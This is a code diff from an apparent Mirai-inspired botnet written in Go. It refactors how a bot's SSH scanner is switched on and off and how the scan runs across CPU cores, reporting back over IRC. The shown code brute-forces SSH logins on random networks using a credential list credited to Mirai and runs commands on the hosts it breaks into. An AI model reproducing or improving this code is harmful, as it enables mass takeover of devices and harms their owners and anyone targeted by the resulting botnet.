@@ -14,9 +14,8 @@ import (
 )
 
 var (
-	wg         sync.WaitGroup
-	ScanSwitch bool
-	randomNet  string //0.0.0.0/0
+	wg        sync.WaitGroup
+	randomNet string //0.0.0.0/0
 
 	/*
 		Thank you mirai for these usernames and passwords list (You are my inspirelation).
@@ -261,6 +260,12 @@ func (b *Bot) sshExecute(comd string, isRoot bool) {
 	sshSesh.Run(comd)
 }
 
+func setScanSwitch() {
+	if setCall, setKey := SetupCaller(ComdSetup(3, ":")); setKey {
+		setCall.CallBot.scanSwitch = true
+	}
+}
+
 func (b *Bot) runScan(scanNetwork []string, isRandom bool, nCores string) bool {
 	for {
 		for net := range scanNetwork {
@@ -281,8 +286,10 @@ func (b *Bot) runScan(scanNetwork []string, isRandom bool, nCores string) bool {
 				var isRun, isLogin bool
 				for user := range userList {
 					for paswd := range paswdList {
-						if isRun || ScanSwitch {
-							return true
+						if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+							if isRun || callSwitch.CallBot.scanSwitch {
+								return true
+							}
 						}
 						sshConn, err := ssh.Dial("tcp", rtnIP, sshConfig(userList[user], paswdList[paswd]))
 						b.session = sshConn
@@ -306,40 +313,46 @@ func (b *Bot) runScan(scanNetwork []string, isRandom bool, nCores string) bool {
 				}
 				continue
 			}
-			if ScanSwitch {
-				return true
+			if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+				if callSwitch.CallBot.scanSwitch {
+					return true
+				}
 			}
 		}
-		if ScanSwitch {
-			return true
+		if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+			if callSwitch.CallBot.scanSwitch {
+				return true
+			}
 		}
 	}
 }
 
-func (b *Bot) Scanner(scanNetwork, server string) {
-	b.pServer = server
-	if value, key := ScanMap[scanNetwork]; key {
-		/*
-			Full cores scanning of a bot CPU
-			Create a concurrence following by numbers of cores in CPU.
+func (b *Bot) Scanner() {
+	if setCall, setKey := SetupCaller(ComdSetup(3, ":")); setKey {
+		b.pServer = setCall.CallBot.pServer
+		if value, key := ScanMap[setCall.CallBot.scanOpt]; key {
+			/*
+				Full cores scanning of a bot CPU
+				Create a concurrence following by numbers of cores in CPU.
 
-			Why use cores to scan instead of threads???
-			1) because i need to be careful about overheat problem of a bot device even threads in Go are light weight.
-			2) for against excess flood on IRC server when bot device have more than 4 cores which is equal to cores times 2 when using threads.
-		*/
-		b.Report("👁 [" + strconv.Itoa(b.CPU) + "]CORES START SCANNING...")
-		isBreak := make(chan bool)
-		for i := 0; i < b.CPU; i++ {
-			wg.Add(i)
-			go func(ncpu int) {
-				scanStatus := b.runScan(value.scanNetwork, value.isRandom, "[C"+strconv.Itoa(ncpu+1)+"]")
-				if scanStatus {
-					isBreak <- scanStatus
-				}
-			}(i)
-		}
-		if <-isBreak {
-			b.Report("🛎 [" + strconv.Itoa(b.CPU) + "]CORES STOP SCANNING!!!")
+				Why use cores to scan instead of threads???
+				1) Because i need to be careful about overheat problem of a bot device even threads in Go are light weight.
+				2) For against excess flood on IRC server when bot device have more than 4 cores which is equal to cores times 2 when using threads.
+			*/
+			b.Report("👁 [" + strconv.Itoa(b.CPU) + "]CORES START SCANNING...")
+			isBreak := make(chan bool)
+			for i := 0; i < b.CPU; i++ {
+				wg.Add(i)
+				go func(ncpu int) {
+					scanStatus := b.runScan(value.scanNetwork, value.isRandom, "[C"+strconv.Itoa(ncpu+1)+"]")
+					if scanStatus {
+						isBreak <- scanStatus
+					}
+				}(i)
+			}
+			if <-isBreak {
+				b.Report("🛎 [" + strconv.Itoa(b.CPU) + "]CORES STOP SCANNING!!!")
+			}
 		}
 	}
 }
